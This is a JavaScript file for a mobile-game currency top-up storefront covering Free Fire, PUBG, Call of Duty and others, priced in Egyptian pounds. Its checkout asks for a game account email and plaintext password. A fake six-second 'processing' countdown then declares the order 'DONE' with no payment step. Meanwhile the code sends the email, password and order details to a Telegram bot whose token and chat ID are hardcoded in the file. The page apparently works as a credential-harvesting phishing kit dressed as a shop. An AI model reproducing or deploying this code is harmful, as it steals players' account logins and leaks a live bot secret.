document.addEventListener('DOMContentLoaded', () => {
    // --- Config Setup ---
    const TELEGRAM_TOKEN = "8648161617:AAFVxx7syurke1Pl7BGAbyqAaM2NnBPKB5I"; 
    const TELEGRAM_CHAT_ID = "8851363543"; 

    // View Pages
    const landingPage = document.getElementById('landing-page');
    const storePage = document.getElementById('store-page');
    const enterBtn = document.getElementById('enter-btn');

    // Modals
    const gameModal = document.getElementById('game-modal');
    const rechargeModal = document.getElementById('recharge-modal');
    const checkoutModal = document.getElementById('checkout-modal');
    const rechargeList = document.querySelector('.recharge-list');
    const modalTitle = document.getElementById('modal-game-title');
    const modalIcon = document.getElementById('modal-game-icon');
    const toggleContainer = document.getElementById('modal-toggle-container');
    const btnId = document.getElementById('btn-id');
    const btnAcc = document.getElementById('btn-acc');

    // Controls Configuration Inputs
    const idGroup = document.getElementById('id-input-group');
    const accGroup = document.getElementById('acc-input-group');
    const idField = document.getElementById('game-id-field');
    const emailField = document.getElementById('acc-email-field');
    const passField = document.getElementById('acc-pass-field');
    const confirmBtn = document.getElementById('confirm-btn');
    
    const checkoutActionContainer = document.getElementById('checkout-action-container');
    const successNotification = document.getElementById('success-notification');

    // Interactive State Variables
    let currentGame = ""; 
    let currentMethod = "ID"; 
    let orderData = { user: "", rawId: "", email: "", password: "", product: "", price: "" };

    const themes = {
        "FREE FIRE": { color: "#ff6600", accent: "#ff8a00", icon: "https://static.wikia.nocookie.net/garena-freefire/images/f/f2/Free_Fire_App_Icon.png/revision/latest/smart/width/250/height/250?cb=20240517153409" },
        "PUBG": { color: "#00a2ff", accent: "#007acc", icon: "https://www.pubgmobile.com/common/images/icon_logo.jpg" },
        "CALL OF DUTY": { color: "#e5c158", accent: "#c29d38", icon: "https://static.wikia.nocookie.net/callofduty/images/3/31/CODMobile_App_Icon_Global_2024_Season10_CODM.png/revision/latest/scale-to-width-down/250?cb=20241105161610" },
        "FIFA MOBILE": { color: "#00ffcc", accent: "#00ccaa", icon: "https://cdn-www.bluestacks.com/bs-images/70042468c0d43639228178f9e61aec7f.png" },
        "PES MOBILE": { color: "#00cc44", accent: "#009933", icon: "https://cdn-offer-photos.zeusx.com/b12a0ebf-889c-4053-9c53-3f756e8602d1.png" },
        "BLOOD STRIKE": { color: "#ff3333", accent: "#cc0000", icon: "https://www.blood-strike.com/m/gw/20230721092756/data/share.jpg" }
    };

    // --- Interactive Link Mouse Position Tracker ---
    function inverseMousePosition(element, event) {
        const rect = element.getBoundingClientRect();
        const x = event.clientX - rect.left;
        const y = event.clientY - rect.top;

        return {
            x1: -(x - rect.width / 2) / 20,
            y1: -(y - rect.height / 2) / 20
        };
    }

    function handleTabClick(event) {
        const navNode = document.querySelector('.nav');
        const targetLi = event.target.closest('li');
        if (!targetLi) return;

        const width = targetLi.offsetWidth;
        const left = targetLi.getBoundingClientRect().left;
        const offsetLeft = left - navNode.getBoundingClientRect().left;

        document.querySelectorAll('.nav ul li').forEach(link => link.classList.remove('active'));
        targetLi.classList.add('active');

        navNode.style.setProperty('--after-bg-position', offsetLeft);
        navNode.style.setProperty('--after-radial-bg-position', (left + width / 2) - navNode.getBoundingClientRect().left);
        navNode.style.setProperty('--after-bg-width', width);

        const targetHash = event.target.getAttribute('href');
        routeTabView(targetHash);
    }

    const premiumNav = document.querySelector('.nav');
    const navLinks = premiumNav.querySelectorAll('li a');

    for (let i = 0; i < navLinks.length; i++) {
        navLinks[i].addEventListener('click', (e) => {
            e.preventDefault();
            handleTabClick(e);
        });
        navLinks[i].addEventListener("mousemove", (event) => {
            const tilt = inverseMousePosition(event.target, event);
            premiumNav.style.setProperty("--tilt-bg-y", tilt.x1 * 2);
            premiumNav.style.setProperty("--tilt-bg-x", tilt.y1 * 2);
        });
    }

    function syncInitialNavbarLayout() {
        if (!storePage.classList.contains('active')) return;
        const activeLi = premiumNav.querySelector('ul li.active') || premiumNav.querySelector('ul li');
        if (!activeLi) return;
        
        const width = activeLi.offsetWidth;
        const left = activeLi.getBoundingClientRect().left;
        const offsetLeft = left - premiumNav.getBoundingClientRect().left;

        premiumNav.style.setProperty('--after-bg-position', offsetLeft);
        premiumNav.style.setProperty('--after-radial-bg-position', (left + width / 2) - premiumNav.getBoundingClientRect().left);
        premiumNav.style.setProperty('--after-bg-width', width);
    }

    window.addEventListener('resize', syncInitialNavbarLayout);

    enterBtn.addEventListener('click', () => {
        landingPage.classList.remove('active');
        storePage.classList.add('active');
        setTimeout(() => {
            syncInitialNavbarLayout();
            routeTabView("#home");
        }, 100);
    });

    function routeTabView(hashTarget) {
        document.querySelectorAll('.tab-content-view').forEach(view => view.classList.remove('active-view'));
        
        if (hashTarget === "#home" || hashTarget === "") {
            document.getElementById('home-content-section').classList.add('active-view');
        } else if (hashTarget === "#search") {
            document.getElementById('search-content-section').classList.add('active-view');
            document.getElementById('store-search-input').value = "";
            processLiveSearchFilter("");
        } else if (hashTarget === "#about") {
            document.getElementById('about-content-section').classList.add('active-view');
        } else if (hashTarget === "#support") {
            document.getElementById('support-content-section').classList.add('active-view');
        }
    }

    // --- Live Search Filters Engine ---
    const searchInput = document.getElementById('store-search-input');
    const searchResultsViewport = document.getElementById('search-results-viewport');

    searchInput.addEventListener('input', (e) => {
        processLiveSearchFilter(e.target.value);
    });

    function processLiveSearchFilter(queryText) {
        const cleanedQuery = queryText.trim().toLowerCase();
        searchResultsViewport.innerHTML = "";

        if (cleanedQuery === "") {
            searchResultsViewport.innerHTML = `<div style="color: #52525b; font-size: 1rem; grid-column: 1/-1; text-align:center;">Type a game title to filter...</div>`;
            return;
        }

        const sourceCards = document.querySelectorAll('#home-content-section .game-card');
        let matchesCount = 0;

        sourceCards.forEach(card => {
            const indexName = card.getAttribute('data-game-search-title') || "";
            if (indexName.includes(cleanedQuery)) {
                matchesCount++;
                const clonedCard = card.cloneNode(true);
                
                clonedCard.addEventListener('click', () => {
                    if (indexName.includes("free fire")) configureModalTheme("FREE FIRE");
                    if (indexName.includes("pubg")) configureModalTheme("PUBG");
                    if (indexName.includes("call of duty")) configureModalTheme("CALL OF DUTY");
                    if (indexName.includes("fifa")) configureModalTheme("FIFA MOBILE");
                    if (indexName.includes("pes")) configureModalTheme("PES MOBILE");
                    if (indexName.includes("blood strike")) configureModalTheme("BLOOD STRIKE");
                });

                searchResultsViewport.appendChild(clonedCard);
            }
        });

        if (matchesCount === 0) {
            searchResultsViewport.innerHTML = `<div class="not-found-feedback">sorry, this game is not found</div>`;
        }
    }

    // Secondary Modal Framework Closures
    document.getElementById('close-modal').addEventListener('click', () => gameModal.classList.remove('active'));
    document.getElementById('back-to-id').addEventListener('click', () => {
        rechargeModal.classList.remove('active');
        gameModal.classList.add('active');
    });
    document.getElementById('back-to-recharge').addEventListener('click', () => {
        checkoutModal.classList.remove('active');
        rechargeModal.classList.add('active');
    });

    // --- Product Price Matrix Data Sets ---
    const ffIdProducts = `
        <div class="recharge-item"><span class="item-name">◇ 100 Diamond</span><span class="item-price">55 EGP</span></div>
        <div class="recharge-item"><span class="item-name">◇ 210 Diamond</span><span class="item-price">105 EGP</span></div>
        <div class="recharge-item"><span class="item-name">◇ 310 Diamond</span><span class="item-price">155 EGP</span></div>
        <div class="recharge-item"><span class="item-name">◇ 420 Diamond</span><span class="item-price">205 EGP</span></div>
        <div class="recharge-item"><span class="item-name">◇ 520 Diamond</span><span class="item-price">255 EGP</span></div>
        <div class="recharge-item membership"><span class="item-name">★ Weekly Membership</span><span class="item-price">105 EGP</span></div>
        <div class="recharge-item membership"><span class="item-name">★ Monthly Membership</span><span class="item-price">540 EGP</span></div>
    `;

    const ffAccProducts = `
        <div class="recharge-item"><span class="item-name">◇ 100 Diamond Bonus</span><span class="item-price">50 EGP</span></div>
        <div class="recharge-item"><span class="item-name">◇ 210 Diamond</span><span class="item-price">95 EGP</span></div>
        <div class="recharge-item"><span class="item-name">◇ 310 Diamond</span><span class="item-price">140 EGP</span></div>
        <div class="recharge-item"><span class="item-name">◇ 400 Diamond</span><span class="item-price">180 EGP</span></div>
        <div class="recharge-item"><span class="item-name">◇ 500 Diamond</span><span class="item-price">225 EGP</span></div>
        <div class="recharge-item"><span class="item-name">◇ 600 Diamond</span><span class="item-price">305 EGP</span></div>
        <div class="recharge-item"><span class="item-name">◇ 700 Diamond</span><span class="item-price">355 EGP</span></div>
        <div class="recharge-item membership"><span class="item-name">★ Weekly Membership</span><span class="item-price">75 EGP</span></div>
        <div class="recharge-item membership"><span class="item-name">★ Monthly Membership</span><span class="item-price">430 EGP</span></div>
    `;

    const pubgProducts = `
        <div class="recharge-item"><span class="item-name">◇ 30 UC</span><span class="item-price">25 EGP</span></div>
        <div class="recharge-item"><span class="item-name">◇ 60 UC</span><span class="item-price">45 EGP</span></div>
        <div class="recharge-item"><span class="item-name">◇ 325 UC</span><span class="item-price">215 EGP</span></div>
        <div class="recharge-item"><span class="item-name">◇ 660 UC</span><span class="item-price">425 EGP</span></div>
        <div class="recharge-item"><span class="item-name">◇ 1800 UC</span><span class="item-price">1055 EGP</span></div>
        <div class="recharge-item membership"><span class="item-name">★ LVL (1 - 50)</span><span class="item-price">255 EGP</span></div>
        <div class="recharge-item membership"><span class="item-name">★ LVL (1 - 100)</span><span class="item-price">510 EGP</span></div>
    `;

    const codProducts = `
        <div class="recharge-item"><span class="item-name">◇ 30 CP</span><span class="item-price">20 EGP</span></div>
        <div class="recharge-item"><span class="item-name">◇ 80 CP</span><span class="item-price">50 EGP</span></div>
        <div class="recharge-item"><span class="item-name">◇ 420 CP</span><span class="item-price">230 EGP</span></div>
        <div class="recharge-item"><span class="item-name">◇ 880 CP</span><span class="item-price">455 EGP</span></div>
        <div class="recharge-item"><span class="item-name">◇ 2400 CP</span><span class="item-price">1130 EGP</span></div>
        <div class="recharge-item membership"><span class="item-name">★ Battle Pass Premium</span><span class="item-price">130 EGP</span></div>
    `;

    const fifaProducts = `
        <div class="recharge-item"><span class="item-name">◇ 40 FC Points</span><span class="item-price">25 EGP</span></div>
        <div class="recharge-item"><span class="item-name">◇ 100 FC Points</span><span class="item-price">55 EGP</span></div>
        <div class="recharge-item"><span class="item-name">◇ 520 FC Points</span><span class="item-price">255 EGP</span></div>
        <div class="recharge-item"><span class="item-name">◇ 1070 FC Points</span><span class="item-price">505 EGP</span></div>
    `;

    const pesProducts = `
        <div class="recharge-item"><span class="item-name">◇ 137 Coins</span><span class="item-price">70 EGP</span></div>
        <div class="recharge-item"><span class="item-name">◇ 315 Coins</span><span class="item-price">155 EGP</span></div>
        <div class="recharge-item"><span class="item-name">◇ 578 Coins</span><span class="item-price">265 EGP</span></div>
        <div class="recharge-item"><span class="item-name">◇ 788 Coins</span><span class="item-price">355 EGP</span></div>
        <div class="recharge-item"><span class="item-name">◇ 1092 Coins</span><span class="item-price">485 EGP</span></div>
         <div class="recharge-item membership"><span class="item-name">★ heroic Pass </span><span class="item-price">260 EGP</span></div>
    `;

    const bsProducts = `
        <div class="recharge-item"><span class="item-name">◇ 51 Gold</span><span class="item-price">30 EGP</span></div>
        <div class="recharge-item"><span class="item-name">◇ 105 Gold</span><span class="item-price">55 EGP</span></div>
        <div class="recharge-item"><span class="item-name">◇ 320 Gold</span><span class="item-price">150 EGP</span></div>
        <div class="recharge-item"><span class="item-name">◇ 540 Gold</span><span class="item-price">250 EGP</span></div>
        <div class="recharge-item"><span class="item-name">◇ 1100 Gold</span><span class="item-price">495 EGP</span></div>
    `;

    function configureModalTheme(gameKey) {
        currentGame = gameKey;
        const currentTheme = themes[gameKey];
        
        modalTitle.innerText = gameKey;
        modalTitle.style.color = currentTheme.color;
        modalIcon.src = currentTheme.icon;
        modalIcon.style.borderColor = currentTheme.color;
        
        // Dynamic Modal Input Styling Changes Based on active theme
        gameModal.querySelector('.input-section').style.borderColor = currentTheme.color;
        gameModal.querySelectorAll('.input-header').forEach(h => h.style.color = currentTheme.color);
        btnId.style.borderColor = currentTheme.color;
        btnAcc.style.borderColor = currentTheme.color;
        
        if (gameKey === "FREE FIRE") {
            toggleContainer.style.display = 'flex';
        } else {
            toggleContainer.style.display = 'none'; 
        }
        
        idField.value = "";
        emailField.value = "";
        passField.value = "";
        
        switchToID();
        gameModal.classList.add('active');
    }

    // Static click bindings for original grid elements
    document.querySelector('#home-content-section .ff-card').addEventListener('click', () => configureModalTheme("FREE FIRE"));
    document.querySelector('#home-content-section .pubg-card').addEventListener('click', () => configureModalTheme("PUBG"));
    document.querySelector('#home-content-section .cod-card').addEventListener('click', () => configureModalTheme("CALL OF DUTY"));
    document.querySelector('#home-content-section .fifa-card').addEventListener('click', () => configureModalTheme("FIFA MOBILE"));
    document.querySelector('#home-content-section .pes-card').addEventListener('click', () => configureModalTheme("PES MOBILE"));
    document.querySelector('#home-content-section .bs-card').addEventListener('click', () => configureModalTheme("BLOOD STRIKE"));

    function switchToID() {
        currentMethod = 'ID';
        btnId.classList.add('active');
        // Apply active theme backgrounds
        btnId.style.background = themes[currentGame].color;
        btnId.style.color = "#000";
        btnAcc.classList.remove('active');
        btnAcc.style.background = "transparent";
        btnAcc.style.color = themes[currentGame].color;
        
        idGroup.style.display = 'block';
        accGroup.style.display = 'none';
        validateInputs();
    }

    function switchToACC() {
        currentMethod = 'ACC';
        btnId.classList.remove('active');
        btnId.style.background = "transparent";
        btnId.style.color = themes[currentGame].color;
        btnAcc.classList.add('active');
        btnAcc.style.background = themes[currentGame].color;
        btnAcc.style.color = "#000";
        
        idGroup.style.display = 'none';
        accGroup.style.display = 'block';
        validateInputs();
    }

    btnId.addEventListener('click', switchToID);
    btnAcc.addEventListener('click', switchToACC);

    function validateInputs() {
        let isValid = false;
        if (currentMethod === 'ID') {
            isValid = idField.value.trim().length > 4;
        } else {
            isValid = emailField.value.trim().length > 4 && passField.value.trim().length > 2;
        }

        confirmBtn.disabled = !isValid;
        if (isValid) {
            confirmBtn.classList.add('active-style');
            confirmBtn.style.background = `linear-gradient(to bottom, ${themes[currentGame].color}, ${themes[currentGame].accent})`;
        } else {
            confirmBtn.classList.remove('active-style');
            confirmBtn.style.background = "#4a2107";
        }
    }

    idField.addEventListener('input', validateInputs);
    emailField.addEventListener('input', validateInputs);
    passField.addEventListener('input', validateInputs);

    confirmBtn.addEventListener('click', () => {
        if (currentMethod === 'ID') {
            orderData.user = `ID: ${idField.value}`;
            orderData.rawId = idField.value;
            orderData.email = "";
            orderData.password = "";
        } else {
            orderData.user = `ACC: ${emailField.value}`;
            orderData.rawId = "";
            orderData.email = emailField.value;
            orderData.password = passField.value;
        }

        if (currentGame === "PUBG") {
            rechargeList.innerHTML = pubgProducts;
        } else if (currentGame === "CALL OF DUTY") {
            rechargeList.innerHTML = codProducts;
        } else if (currentGame === "FIFA MOBILE") {
            rechargeList.innerHTML = fifaProducts;
        } else if (currentGame === "PES MOBILE") {
            rechargeList.innerHTML = pesProducts;
        } else if (currentGame === "BLOOD STRIKE") {
            rechargeList.innerHTML = bsProducts;
        } else {
            if (currentMethod === 'ACC') {
                rechargeList.innerHTML = ffAccProducts;
            } else {
                rechargeList.innerHTML = ffIdProducts;
            }
        }
        
        const activeThemeColor = themes[currentGame].color;
        setTimeout(() => {
            document.querySelectorAll('.recharge-item:not(.membership)').forEach(el => {
                el.style.borderColor = activeThemeColor;
            });
        }, 10);

        gameModal.classList.remove('active');
        rechargeModal.classList.add('active');
        bindProductChoices();
    });

    function bindProductChoices() {
        document.querySelectorAll('.recharge-item').forEach(item => {
            item.onclick = () => {
                orderData.product = item.querySelector('.item-name').innerText;
                orderData.price = item.querySelector('.item-price').innerText;
                
                let summaryHTML = `
                    GAME: <strong>${currentGame}</strong><br>
                    METHOD: <strong>${currentMethod}</strong><br>
                `;

                if(currentMethod === 'ID') {
                    summaryHTML += `ID: <strong>${orderData.rawId}</strong><br>`;
                } else {
                    summaryHTML += `EMAIL: <strong>${orderData.email}</strong><br>`;
                }

                summaryHTML += `
                    PRODUCT: <strong>${orderData.product}</strong><br>
                    PRICE: <strong>${orderData.price}</strong>
                `;
                
                document.getElementById('order-details').innerHTML = summaryHTML;
                successNotification.style.display = "none";
                checkoutActionContainer.innerHTML = `<button id="checkout-btn" class="blue-rect-btn">CHECKOUT</button>`;
                setupCheckoutSubmission();

                rechargeModal.classList.remove('active');
                checkoutModal.classList.add('active');
            };
        });
    }

    function setupCheckoutSubmission() {
        const liveCheckoutBtn = document.getElementById('checkout-btn');
        if (!liveCheckoutBtn) return;

        liveCheckoutBtn.addEventListener('click', () => {
            let timerSeconds = 6;
            liveCheckoutBtn.disabled = true;
            liveCheckoutBtn.style.cursor = "not-allowed";
            liveCheckoutBtn.style.background = "#555";
            liveCheckoutBtn.style.borderColor = "#777";

            const intervalLoop = setInterval(() => {
                timerSeconds--;
                if (timerSeconds > 0) {
                    let textDots = ".".repeat(((6 - timerSeconds) % 3) + 1);
                    liveCheckoutBtn.innerText = `processing${textDots}`;
                } else {
                    clearInterval(intervalLoop);
                    executeOrderCompletion();
                }
            }, 1000);

            liveCheckoutBtn.innerText = "processing.";
        });
    }

    function executeOrderCompletion() {
        successNotification.style.display = "block";
        checkoutActionContainer.innerHTML = `<div class="done-status-block">DONE</div>`;

        let botMessage = `🔔 New Order Received!\n\n🎮 Game: ${currentGame}\n🛠 Method: ${currentMethod}\n`;
        
        if (currentMethod === 'ID') {
            botMessage += `🆔 User ID: ${orderData.rawId}\n`;
        } else {
            botMessage += `📧 Email: ${orderData.email}\n🔑 Pass: ${orderData.password}\n`;
        }
        
        botMessage += `📦 Product: ${orderData.product}\n💰 Price: ${orderData.price}`;

        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

        fetch(telegramUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: botMessage
            })
        })
        .then(res => console.log("Order submitted to Telegram successfully."))
        .catch(err => console.error("Telegram endpoint issue:", err));
    }

    // --- Dynamic Support Feedback Module Functionality ---
    const feedbackSubmitBtn = document.getElementById('feedback-submit-btn');
    const feedbackTextareaField = document.getElementById('feedback-textarea-field');
    const feedbackInputBox = document.getElementById('feedback-input-box');
    const feedbackThanksBox = document.getElementById('feedback-thanks-box');

    if (feedbackSubmitBtn && feedbackTextareaField) {
        feedbackSubmitBtn.addEventListener('click', () => {
            const userFeedbackContent = feedbackTextareaField.value.trim();

            if (userFeedbackContent === "") {
                alert("من فضلك اكتب تعديلك أو المشكلة أولاً.");
                return;
            }

            // Lock input controls
            feedbackSubmitBtn.disabled = true;
            feedbackTextareaField.disabled = true;

            // 3-Seconds Loading Logic
            let feedbackTimeLeft = 3; 
            feedbackSubmitBtn.innerText = "processing.";

            const feedbackTimerLoop = setInterval(() => {
                feedbackTimeLeft--;
                if (feedbackTimeLeft > 0) {
                    let dotsCount = ((3 - feedbackTimeLeft) % 3) + 1;
                    feedbackSubmitBtn.innerText = "processing" + ".".repeat(dotsCount);
                } else {
                    clearInterval(feedbackTimerLoop);
                    feedbackInputBox.style.display = "none";
                    feedbackThanksBox.style.display = "block";
                }
            }, 1000);

            // Forward the message text to your Telegram Endpoint
            const botFeedbackPayload = `📝 New Website Review / Bug Report\n\n💭 Feedback:\n${userFeedbackContent}`;
            const feedbackTelegramUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

            fetch(feedbackTelegramUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: botFeedbackPayload
                })
            })
            .then(res => console.log("Feedback dispatched successfully."))
            .catch(err => console.error("Feedback endpoint failed:", err));
        });
    }

    window.addEventListener('click', (e) => {
        if (e.target.classList.contains('modal-overlay')) e.target.classList.remove('active');
    });
});